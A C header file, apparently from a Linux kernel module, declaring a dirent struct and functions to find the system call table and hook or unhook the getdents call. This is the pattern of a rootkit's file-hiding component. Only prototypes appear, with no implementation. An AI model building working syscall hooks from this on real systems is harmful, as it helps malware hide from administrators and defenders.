#ifndef _HOOKING_H
#define _HOOKING_H
struct linux_dirent {
    long           d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};
unsigned long * find_systable(void);
asmlinkage long new_dents(unsigned int fd, struct linux_dirent __user * dirent, unsigned int count);
int hook_dents(void);
void unhook_dents(void);
#endif
